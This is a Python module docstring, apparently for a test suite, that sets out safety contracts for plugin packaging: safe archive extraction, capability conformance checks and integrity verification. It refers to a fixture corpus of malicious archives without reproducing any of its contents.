"""Plugin packaging foundation: manifest, capability conformance, safe extraction.

Four contracts, ordered by how much damage getting them wrong does:

1. **A hostile archive never writes outside a temp root, and never leaves a
   partially-populated destination.** Every case in
   ``tests/fixtures/malicious_archives/`` is asserted to raise *and* to leave
   the destination's parent directory byte-for-byte as it was — no ``dest``, no
   leftover temp directory, no escaped file.
2. **Rejection happens before writing, not after.** ``inspect_archive`` decides
   on headers alone; the extractor is a second line, not the first.
3. **A declared capability is a contract verified against content.** A manifest
   saying ``shellBlocks: false`` whose skill declares a shell block fails, which
   is the only thing that makes an install prompt worth reading.
4. **Integrity covers what was extracted**, including the file the archive
   quietly added that the manifest never mentioned.

The corpus is generated by ``fixtures/malicious_archives/build_corpus.py`` and
committed as bytes; :func:`test_committed_corpus_matches_its_generator` keeps
the two from drifting apart.
"""

